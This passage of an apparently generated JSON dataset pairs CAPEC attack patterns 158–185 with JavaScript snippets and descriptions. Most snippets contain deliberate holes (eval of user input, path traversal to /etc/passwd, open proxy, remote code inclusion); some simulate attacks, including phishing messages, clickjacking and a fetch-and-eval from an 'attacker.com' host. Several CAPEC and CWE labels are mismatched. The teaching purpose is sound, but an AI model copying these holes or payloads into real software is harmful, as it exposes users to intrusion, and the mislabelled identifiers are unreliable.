        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/login' endpoint. When such a request is received, it collects the data in cleartext and logs it to the console. This represents a potential sniffing attack vulnerability (CAPEC-156) because sensitive information (e.g., login credentials) is transmitted in cleartext (CWE-319) and can be intercepted by an unauthorized actor. The code does not encrypt the sensitive data before transmission (CWE-311), nor does it ensure message integrity (CWE-924), making it susceptible to interception and potential modification during transmission."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Vulnerable: Collecting data in cleartext\n    });\n    req.on('end', () => {\n      console.log('Received login data:', body); // Vulnerable: Logging sensitive data\n      res.end('Login data received');\n    });\n  } else {\n    res.end('Hello World');\n  }\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/login' endpoint. When such a request is received, it collects the data in cleartext and logs it to the console. This embodies the CAPEC 'Sniffing Network Traffic' by demonstrating how sensitive information (e.g., login credentials) can be transmitted in cleartext (CWE-319) and logged without encryption (CWE-311), making it susceptible to network sniffing attacks. The code also highlights the risk of exposing sensitive information to unauthorized actors (CWE-497)."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// User input for library path\nlet userLibraryPath = process.argv[2];\n\n// Vulnerable code: using user-supplied path to load a library\ntry {\n  let library = require(path.resolve(userLibraryPath, 'library.js'));\n  library.execute();\n} catch (err) {\n  console.error('Failed to load library:', err);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an application uses a user-supplied path to load an external library. The `userLibraryPath` is taken from user input (command line arguments in this case), and the `require` function is used to load a library from this path. This embodies the main idea of the CAPEC 'Redirect Access to Libraries', as an adversary can supply a malicious path to redirect the application's attempt to load a legitimate library to a malicious one. This can lead to the execution of unauthorized code. The related CWEs are represented as follows: CWE-426 (Untrusted Search Path) and CWE-73 (External Control of File Name or Path) are directly involved since the path is controlled by user input, and CWE-427 (Uncontrolled Search Path Element) is also relevant as the search path includes user-controlled elements."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const script = queryObject.script;\n\n  if (script) {\n    try {\n      eval(script); // CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n    } catch (e) {\n      res.writeHead(500, {'Content-Type': 'text/html'});\n      res.end(`<h1>Error</h1><p>${e.message}</p>`); // CWE-81: Improper Neutralization of Script in an Error Message Web Page\n    }\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end('<h1>Hello World</h1>');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the URL to extract a 'script' parameter from the query string. If the 'script' parameter is present, it attempts to execute the script using the 'eval' function. This is a direct example of CWE-79 (Cross-site Scripting), where user input is not properly neutralized before being executed. If an error occurs during script execution, the error message is sent back to the client without proper neutralization, demonstrating CWE-81 (Improper Neutralization of Script in an Error Message Web Page). This code embodies the main idea of CAPEC-111 (Exploit Script-Based APIs) by showing how an attacker can inject and execute arbitrary scripts through an API that improperly handles scripting instructions."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const parsedUrl = url.parse(req.url, true);\n  const targetHost = parsedUrl.query.target;\n\n  if (!targetHost) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request: No target specified');\n    return;\n  }\n\n  const options = {\n    hostname: targetHost,\n    port: 80,\n    path: '/',\n    method: 'GET'\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    let data = '';\n    proxyRes.on('data', (chunk) => {\n      data += chunk;\n    });\n    proxyRes.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  });\n\n  proxyReq.on('error', (e) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Error: ${e.message}`);\n  });\n\n  proxyReq.end();\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that acts as a proxy, forwarding requests to a target host specified in the query parameters. The code demonstrates several vulnerabilities related to the CAPEC description and associated CWEs:\n\n1. **Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)**: The server forwards requests to any target host specified by the user without validating the endpoint, allowing an attacker to redirect traffic to a malicious server.\n\n2. **Incorrectly Specified Destination in a Communication Channel (CWE-941)**: The target host is taken directly from user input, which can be manipulated to redirect traffic to unintended destinations.\n\n3. **Improper Enforcement of Message Integrity During Transmission in a Communication Channel (CWE-924)**: The code does not verify the integrity of the messages received from the target host, making it susceptible to man-in-the-middle attacks.\n\n4. **Exposure of Sensitive System Information to an Unauthorized Control Sphere (CWE-497)**: Error messages and responses from the target host are directly sent back to the client, potentially exposing sensitive information.\n\nThis code embodies the main idea of the CAPEC by demonstrating how an attacker can manipulate network infrastructure to redirect traffic and potentially gather sensitive information from unsuspecting users."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n\n<form action=\"/purchase\" method=\"POST\">\n  <input type=\"hidden\" name=\"item_id\" value=\"12345\">\n  <input type=\"hidden\" name=\"price\" value=\"100\">\n  <input type=\"hidden\" name=\"quantity\" value=\"1\">\n  <input type=\"submit\" value=\"Buy Now\">\n</form>\n\n<script>\n  // Simulating an attacker modifying the hidden fields\n  document.querySelector('input[name=\"price\"]').value = '1'; // Change price to $1\n  document.querySelector('input[name=\"quantity\"]').value = '10'; // Change quantity to 10\n</script>\n\n</body>\n</html>",
        "description": "This HTML and JavaScript code snippet demonstrates a vulnerability where hidden fields in an HTML form are used to store sensitive information such as price and quantity. The form is intended to submit a purchase request to the server. However, an attacker can manipulate these hidden fields using JavaScript before the form is submitted. In this example, the price is changed from $100 to $1, and the quantity is changed from 1 to 10. This represents the CAPEC 'Manipulating Hidden Fields' and highlights related CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602), 'Reliance on Untrusted Inputs in a Security Decision' (CWE-807), and 'External Control of Assumed-Immutable Web Parameter' (CWE-472). The server should not trust client-side data and must validate all inputs on the server side to prevent such attacks."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "const trustedDomain = 'https://trusted.example.com';\nconst userEmail = 'user@example.com';\n\nfunction sendPhishingEmail() {\n  const phishingLink = `https://malicious.example.com?redirect=${encodeURIComponent(trustedDomain)}`;\n  const emailContent = `Dear user,\\n\\nWe noticed unusual activity on your account. Please verify your information by clicking the link below:\\n\\n<a href=\"${phishingLink}\" target=\"_blank\">Verify Now</a>\\n\\nThank you,\\nTrusted Support Team`;\n  sendEmail(userEmail, 'Account Verification Required', emailContent);\n}\n\nfunction sendEmail(to, subject, body) {\n  // Simulated email sending function\n  console.log(`Sending email to: ${to}\\nSubject: ${subject}\\nBody: ${body}`);\n}\n\nsendPhishingEmail();",
        "description": "This JavaScript code snippet simulates a spear phishing attack by sending a targeted email to a specific user. The email appears to come from a trusted entity and contains a link that redirects the user to a malicious site. The link uses URL redirection (CWE-601) to make the phishing attempt more convincing. The email content is crafted to exploit the user's trust and familiarity with the supposed sender, enhancing the likelihood of the user clicking the link. This embodies the main idea of CAPEC-163 (Spear Phishing) by targeting a specific user with a tailored phishing attack."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "const sendPhishingSMS = (phoneNumber) => {\n  const phishingLink = 'http://malicious-site.com';\n  const message = `You've won a prize! Click here to claim: ${phishingLink}`;\n  // Simulate sending SMS\n  console.log(`Sending SMS to ${phoneNumber}: ${message}`);\n};\n\nconst simulateUserInteraction = (userInput) => {\n  const sensitiveInfo = 'user_password';\n  if (userInput === 'http://malicious-site.com') {\n    console.log(`User entered sensitive information: ${sensitiveInfo}`);\n  } else {\n    console.log('User did not fall for the phishing attempt.');\n  }\n};\n\n// Example usage\nsendPhishingSMS('+1234567890');\nsimulateUserInteraction('http://malicious-site.com');",
        "description": "This JavaScript code snippet demonstrates a basic mobile phishing attack. The `sendPhishingSMS` function simulates sending a phishing SMS to a user's phone number, enticing them to click on a malicious link. The `simulateUserInteraction` function simulates the user clicking on the phishing link and entering sensitive information, which is then logged. This code embodies the main idea of CAPEC-163 (Mobile Phishing) by illustrating how an attacker might use SMS to lure users into providing sensitive information. The code also touches on related CWEs, such as CWE-451 (UI Misrepresentation) by spoofing a legitimate message, and CWE-290 (Authentication Bypass by Spoofing) by tricking the user into revealing their password."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(userInput) {\n  const basePath = '/var/www/app/data/';\n  const filePath = path.join(basePath, userInput);\n\n  if (!filePath.startsWith(basePath)) {\n    throw new Error('Path traversal attempt detected!');\n  }\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('../../etc/passwd');",
        "description": "This JavaScript code snippet demonstrates a potential file manipulation vulnerability through path traversal. The `readFile` function takes user input to construct a file path and reads the file's content. The `path.join` method is used to concatenate the base path with the user input. However, without proper validation, an attacker could provide a malicious input like '../../etc/passwd' to access sensitive files outside the intended directory. The code attempts to mitigate this by checking if the constructed file path starts with the base path, but this check can be bypassed if not implemented correctly. This snippet embodies the main idea of CAPEC-176 (File Manipulation) and highlights related CWEs such as CWE-22 (Path Traversal) and CWE-73 (External Control of File Name or Path)."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "const systemConfig = { secureMode: true, userRole: 'admin' }; \n\nfunction resetSystem() { \n  // CWE-306: Missing Authentication for Critical Function\n  // No authentication check before resetting the system\n  systemConfig.secureMode = false; \n  systemConfig.userRole = 'guest'; \n  console.log('System reset to default values.'); \n} \n\nfunction simulatePowerCycle() { \n  // CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings\n  // Security settings are not properly re-initialized after reset\n  resetSystem(); \n  console.log('Power cycle simulated.'); \n} \n\n// Simulate an attacker forcing a system reset\nsimulatePowerCycle(); \nconsole.log('Current system configuration:', systemConfig);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can force the system to reset its values without proper authentication (CWE-306). The `resetSystem` function resets critical security settings (CWE-1271) without verifying the user's identity, setting `secureMode` to `false` and `userRole` to `guest`. The `simulatePowerCycle` function simulates a power cycle, invoking the reset function and demonstrating how the system's security configuration can be compromised. This embodies the CAPEC concept of forcing the system into a previous state to exploit weaknesses."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "const sensitiveData = 'SecretKey123';\n\nfunction debugMode() {\n    console.log('Debug Mode Activated');\n    console.log('Sensitive Data:', sensitiveData);\n}\n\n// Simulate a condition where debug mode is activated\nif (process.env.DEBUG === 'true') {\n    debugMode();\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is exposed through a debug mode, embodying the concept of White Box Reverse Engineering. The 'sensitiveData' variable holds a secret key, and the 'debugMode' function logs this sensitive data to the console. The debug mode is conditionally activated based on an environment variable 'DEBUG'. This represents CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) and CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime). An attacker with access to the executable could reverse engineer the code, discover the debug mode, and activate it to reveal sensitive information."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to create an ADS\nfunction createADS(filePath, streamName, data) {\n  const adsPath = `${filePath}:${streamName}`;\n  fs.writeFileSync(adsPath, data);\n}\n\n// Function to read an ADS\nfunction readADS(filePath, streamName) {\n  const adsPath = `${filePath}:${streamName}`;\n  return fs.readFileSync(adsPath, 'utf8');\n}\n\n// Example usage\nconst filePath = path.join(__dirname, 'example.txt');\nfs.writeFileSync(filePath, 'This is the main file content.');\ncreateADS(filePath, 'hiddenStream', 'This is hidden in ADS.');\n\nconsole.log('Main file content:', fs.readFileSync(filePath, 'utf8'));\nconsole.log('ADS content:', readADS(filePath, 'hiddenStream'));\n",
        "description": "This JavaScript code snippet demonstrates the creation and reading of an Alternate Data Stream (ADS) in a file on an NTFS file system. The `createADS` function attaches an ADS to a specified file, while the `readADS` function reads the content of the ADS. The example usage shows how to create a file, attach an ADS to it, and then read both the main file content and the ADS content. This embodies the main idea of CAPEC-180, where an attacker can exploit ADS to hide data or malicious tools in a way that is not easily detectable by standard file system utilities. The related CWEs provide additional context, such as improper handling of ADS (CWE-69) and improper removal of sensitive information (CWE-212), which can lead to security vulnerabilities."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Simulated sensitive information\nconst sensitiveInfo = {\n  adminPassword: 'supersecret',\n  userEmails: ['user1@example.com', 'user2@example.com']\n};\n\n// Endpoint that exposes sensitive information\napp.get('/info', (req, res) => {\n  if (req.query.key === 'validKey') {\n    res.send(sensitiveInfo);\n  } else {\n    res.send('Unauthorized access');\n  }\n});\n\n// Endpoint with observable behavioral discrepancy\napp.get('/status', (req, res) => {\n  if (req.query.debug === 'true') {\n    res.send('Debug mode enabled');\n  } else {\n    res.send('Running normally');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with two endpoints. The '/info' endpoint exposes sensitive information (CWE-200) if a specific query parameter is provided, simulating unauthorized access to sensitive data. The '/status' endpoint demonstrates an observable behavioral discrepancy (CWE-205) by returning different responses based on the 'debug' query parameter, which could reveal internal states or configurations to an attacker. This code embodies the main idea of the CAPEC 'Footprinting' by allowing an adversary to probe and explore the target to identify its constituents and properties."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/?query=sensitiveInfo',\n  method: 'GET',\n  headers: {\n    'User-Agent': 'Mozilla/5.0'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Response Headers:', res.headers);\n    console.log('Response Body:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP GET request to a web application, which is a common technique used in web application fingerprinting. The request is sent to 'example.com' with a query string that includes sensitive information. The response headers and body are logged to the console, which can reveal details about the server's software version, error messages, and other sensitive information. This code embodies the CAPEC concept of web application fingerprinting by probing the web application to gather information that could be used for further attacks. The related CWEs are represented as follows: CWE-497 (exposure of sensitive system information) by logging response headers, CWE-598 (use of GET request with sensitive query strings) by including sensitive information in the query string, and CWE-209 (generation of error message containing sensitive information) by potentially revealing sensitive error messages in the response."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "function processUserInput(input) {\n    // CWE-95: Eval Injection\n    eval(input);\n}\n\nfunction main() {\n    // CWE-627: Dynamic Variable Evaluation\n    var userVarName = 'userInput';\n    window[userVarName] = 'alert(\"This is a test\")';\n\n    // CWE-914: Improper Control of Dynamically-Identified Variables\n    processUserInput(window[userVarName]);\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to variable manipulation and dynamic evaluation. The `processUserInput` function takes user input and evaluates it using `eval`, which is a direct example of CWE-95 (Eval Injection). In the `main` function, a variable name is dynamically created and assigned a string that contains JavaScript code (CWE-627: Dynamic Variable Evaluation). This dynamically created variable is then passed to the `processUserInput` function, which evaluates it without proper validation (CWE-914: Improper Control of Dynamically-Identified Variables). This code is vulnerable to attacks where an attacker can inject malicious code through user input, demonstrating the main idea of CAPEC-77: Manipulating User-Controlled Variables."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "document.getElementById('submitButton').addEventListener('click', function() {\n  var hiddenFrame = document.createElement('iframe');\n  hiddenFrame.style.display = 'none';\n  hiddenFrame.src = 'http://malicious-site.com/download';\n  document.body.appendChild(hiddenFrame);\n});",
        "description": "This JavaScript code snippet demonstrates an action spoofing attack. When a user clicks on a button with the ID 'submitButton', they believe they are submitting a form or query. However, the code actually creates a hidden iframe that initiates a download from a malicious site. This embodies the main idea of CAPEC-139 (Action Spoofing) by tricking the user into performing an unintended action. The code also touches on CWE-451 (UI Misrepresentation of Critical Information) by misleading the user about the action they are performing, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by directing the action to a malicious site instead of the intended destination."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "const flashVars = new URLSearchParams(window.location.search);\nconst flashParam = flashVars.get('flashParam');\n\nif (flashParam) {\n  const flashObject = document.createElement('object');\n  flashObject.setAttribute('data', 'flashfile.swf');\n  flashObject.setAttribute('type', 'application/x-shockwave-flash');\n  flashObject.setAttribute('width', '400');\n  flashObject.setAttribute('height', '300');\n  flashObject.setAttribute('flashvars', flashParam);\n  document.body.appendChild(flashObject);\n}",
        "description": "This JavaScript code snippet demonstrates a Flash Parameter Injection vulnerability. It extracts a parameter from the URL query string and injects it into a Flash object embedded within an HTML document. The code does not validate or sanitize the 'flashParam' input, allowing an attacker to inject malicious global parameters into the Flash file. This can lead to various security issues, such as cross-site scripting (XSS) or unauthorized access to the embedding HTML document. The related CWEs provide additional context on potential weaknesses, such as improper neutralization of special elements (CWE-1336) and permissive cross-domain policies (CWE-942), which can exacerbate the vulnerability."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst vm = require('vm');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const scriptUrl = queryObject.scriptUrl;\n\n  if (scriptUrl) {\n    http.get(scriptUrl, (response) => {\n      let scriptData = '';\n      response.on('data', (chunk) => { scriptData += chunk; });\n      response.on('end', () => {\n        try {\n          vm.runInThisContext(scriptData);\n          res.writeHead(200, {'Content-Type': 'text/plain'});\n          res.end('Script executed successfully');\n        } catch (e) {\n          res.writeHead(500, {'Content-Type': 'text/plain'});\n          res.end('Script execution failed');\n        }\n      });\n    }).on('error', (e) => {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Failed to retrieve script');\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No script URL provided');\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the query parameters to extract a 'scriptUrl' parameter, which is expected to be a URL pointing to a JavaScript file. The server then retrieves the script from the provided URL and executes it using the 'vm' module's 'runInThisContext' method. This embodies the main idea of CAPEC-242 (Code Inclusion) by demonstrating how an adversary could exploit a weakness to force arbitrary code to be retrieved from a remote location and executed. The code is vulnerable to CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it imports and executes code from an external source without validation. It also touches on CWE-98 (PHP Remote File Inclusion) in a JavaScript context, where the input URL is not properly restricted before being used to include and execute the script."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable configuration file path\nconst configFilePath = '/etc/app/config.json';\n\n// Function to read and parse the configuration file\nfunction readConfig() {\n  try {\n    const configData = fs.readFileSync(configFilePath, 'utf8');\n    const config = JSON.parse(configData);\n    return config;\n  } catch (err) {\n    console.error('Error reading configuration file:', err);\n    return null;\n  }\n}\n\n// Function to modify a configuration setting\nfunction modifyConfig(setting, value) {\n  const config = readConfig();\n  if (config) {\n    config[setting] = value;\n    try {\n      fs.writeFileSync(configFilePath, JSON.stringify(config, null, 2));\n      console.log('Configuration updated successfully');\n    } catch (err) {\n      console.error('Error writing configuration file:', err);\n    }\n  }\n}\n\n// Example usage: An attacker modifies a critical configuration setting\nmodifyConfig('adminAccess', true);",
        "description": "This JavaScript code snippet demonstrates a vulnerable scenario where an attacker can manipulate an external configuration file to alter the behavior of an application. The code reads a configuration file, modifies a specific setting, and writes the changes back to the file. This embodies the CAPEC concept of 'Configuration/Environment Manipulation' by showing how an attacker can externally control system or configuration settings (CWE-15). The lack of proper access control and validation allows unauthorized modification of critical settings, representing a security risk."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadConfig(configName) {\n  const directories = ['/etc/app/config', './config'];\n  for (const dir of directories) {\n    const filePath = path.join(dir, configName);\n    if (fs.existsSync(filePath)) {\n      return fs.readFileSync(filePath, 'utf8');\n    }\n  }\n  throw new Error('Config file not found');\n}\n\n// Usage\ntry {\n  const config = loadConfig('appConfig.json');\n  console.log('Config loaded:', config);\n} catch (err) {\n  console.error(err.message);\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability where an attacker can exploit the file location algorithm by creating a file with the same name as a protected or privileged file. The `loadConfig` function attempts to load a configuration file by searching through a list of directories. If an attacker places a malicious `appConfig.json` file in the `./config` directory, it will be loaded instead of the legitimate file in `/etc/app/config`. This embodies the main idea of the CAPEC by showing how an attacker can manipulate the system to use their file by placing it in a directory that is searched before the legitimate directory. The related CWEs are represented by the reliance on file names and paths, and the potential for external control over these paths."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "const flashUrl = 'http://trusted-site.com/flash.swf?redirect=' + encodeURIComponent(window.location.href);\nconst iframe = document.createElement('iframe');\niframe.src = flashUrl;\ndocument.body.appendChild(iframe);",
        "description": "This JavaScript code snippet demonstrates a potential Cross-Site Flashing vulnerability. It constructs a URL to a Flash file hosted on a trusted site, appending the current page's URL as a parameter. The Flash file could then use this parameter to load external content. The code creates an iframe and sets its source to the constructed URL, embedding the Flash file in the page. This could allow an attacker to exploit native Flash functionality by manipulating the URL parameter to reference malicious content. The snippet also touches on related CWEs, such as URL redirection (CWE-601) and improper neutralization of input (CWE-79), by showing how user-controlled input (the current URL) is directly included in the Flash file URL without proper validation or sanitization."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "const sensitiveData = 'user=admin&password=secret';\n\n// Vulnerable micro-service call using GET request with sensitive data in query string\nfetch(`/api/getUserData?${sensitiveData}`, {\n  method: 'GET'\n})\n.then(response => response.json())\n.then(data => {\n  console.log('User Data:', data);\n})\n.catch(error => console.error('Error:', error));\n\n// Storing sensitive data in a persistent cookie\ndocument.cookie = `sessionToken=abc123; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/`;\n\n// Storing sensitive file under web root\nconst fs = require('fs');\nfs.writeFileSync('/var/www/html/sensitive.txt', 'Sensitive Information');",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly' and the associated CWEs. The code makes a GET request to a micro-service endpoint, embedding sensitive information directly in the query string (CWE-598). It also stores sensitive data in a persistent cookie (CWE-539), which can be easily accessed by an attacker. Additionally, it writes a file containing sensitive information to the web root directory (CWE-219), making it potentially accessible to unauthorized users. These practices expose the micro-services and sensitive data to potential exploitation by attackers."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check user role\nfunction checkUserRole(req, res, next) {\n  if (req.user && req.user.role === 'admin') {\n    next();\n  } else {\n    res.status(403).send('Forbidden');\n  }\n}\n\n// Incorrectly configured access control\napp.get('/admin', (req, res) => {\n  res.send('Welcome to the admin panel');\n});\n\n// Correctly configured access control\napp.get('/secure-admin', checkUserRole, (req, res) => {\n  res.send('Welcome to the secure admin panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It demonstrates an incorrectly configured access control by allowing access to the '/admin' route without any checks, which embodies the main idea of the CAPEC: 'Exploiting Incorrectly Configured Access Control Security Levels'. The '/admin' route is accessible to any user, representing CWE-732 (Incorrect Permission Assignment for Critical Resource). The '/secure-admin' route, however, uses a middleware function 'checkUserRole' to ensure that only users with the 'admin' role can access it, representing a correctly configured access control. This highlights the importance of proper access control configuration to prevent unauthorized access."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "/* Vulnerable Code: Flash File Overlay for Clickjacking */\n\n// HTML part\nconst iframe = document.createElement('iframe');\niframe.src = 'https://trusted-site.com';\niframe.style.position = 'absolute';\niframe.style.top = '0';\niframe.style.left = '0';\niframe.style.width = '100%';\niframe.style.height = '100%';\niframe.style.opacity = '0'; // Make the iframe transparent\niframe.style.zIndex = '1';\ndocument.body.appendChild(iframe);\n\n// Flash overlay part\nconst flashOverlay = document.createElement('div');\nflashOverlay.innerHTML = '<object type=\"application/x-shockwave-flash\" data=\"overlay.swf\" width=\"100%\" height=\"100%\"></object>';\nflashOverlay.style.position = 'absolute';\nflashOverlay.style.top = '0';\nflashOverlay.style.left = '0';\nflashOverlay.style.width = '100%';\nflashOverlay.style.height = '100%';\nflashOverlay.style.zIndex = '2'; // Ensure the Flash overlay is on top\nflashOverlay.style.pointerEvents = 'none'; // Allow clicks to pass through to the iframe\n\ndocument.body.appendChild(flashOverlay);",
        "description": "This JavaScript code snippet demonstrates a Flash File Overlay attack, which is a form of clickjacking. The code creates an iframe that loads a trusted site and makes it transparent. Then, it overlays a Flash object on top of the iframe. The Flash object is transparent and intercepts user actions, allowing the attacker to perform actions on the trusted site without the user's knowledge. This example also touches on related CWEs: improper restriction of rendered UI layers (CWE-1021), permissive cross-domain policy (CWE-942), and unrestricted upload of dangerous files (CWE-434)."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "function loadFlashContent(url) {\n  var flashObject = document.createElement('object');\n  flashObject.data = url;\n  document.body.appendChild(flashObject);\n}\n\n// Example usage\nvar userProvidedUrl = 'http://example.com/flash.swf';\nloadFlashContent(userProvidedUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation where a user-provided URL is used to load Flash content. The function `loadFlashContent` creates an `object` element and sets its `data` attribute to the provided URL, then appends it to the document body. This can lead to a Flash Injection attack if the URL points to malicious Flash content. The code does not perform any input validation (CWE-20), relies on an incomplete list of disallowed inputs (CWE-184), and could potentially load content from untrusted domains (CWE-942). This snippet embodies the main idea of the CAPEC by showing how an attacker could trick a victim into executing malicious Flash content."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst net = require('net');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const email = queryObject.email;\n  const command = `FETCH ${email}`;\n\n  const client = net.createConnection({ port: 143, host: 'localhost' }, () => {\n    client.write(command);\n  });\n\n  client.on('data', (data) => {\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end(data);\n  });\n\n  client.on('error', (err) => {\n    res.writeHead(500, { 'Content-Type': 'text/plain' });\n    res.end('Internal Server Error');\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet sets up a basic HTTP server that listens for incoming requests. It parses the query parameters from the URL to extract an 'email' parameter, which is then used to construct an IMAP command. The command is sent to a local IMAP server via a TCP connection. The response from the IMAP server is sent back to the client. This code is vulnerable to IMAP/SMTP command injection because it directly incorporates user input into the command without proper sanitization or validation. This can allow an attacker to inject arbitrary commands into the IMAP server. Additionally, the code does not handle errors securely, potentially exposing sensitive information through error messages."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://example.com/malicious-code.js', (res) => {\n  if (res.statusCode !== 200) {\n    console.error('Failed to download code');\n    return;\n  }\n\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // Directly execute the downloaded code without integrity check\n    eval(data);\n  });\n}).on('error', (e) => {\n  console.error(`Got error: ${e.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a software integrity attack by downloading and executing code from a remote server without performing any integrity checks. The code uses the 'http' module to fetch a JavaScript file from 'example.com' and then directly executes it using 'eval'. This embodies CWE-494 (Download of Code Without Integrity Check) as it does not verify the origin or integrity of the downloaded code. The use of 'eval' can lead to CWE-506 (Embedded Malicious Code) if the downloaded script contains malicious instructions. This snippet represents the main idea of the CAPEC by showing how an attacker can undermine software integrity through insecure code execution practices."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "const downloadAndExecute = (url) => {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Download failed:', error));\n};\n\n// Example usage\nconst maliciousUrl = 'http://attacker.com/malicious.js';\ndownloadAndExecute(maliciousUrl);",
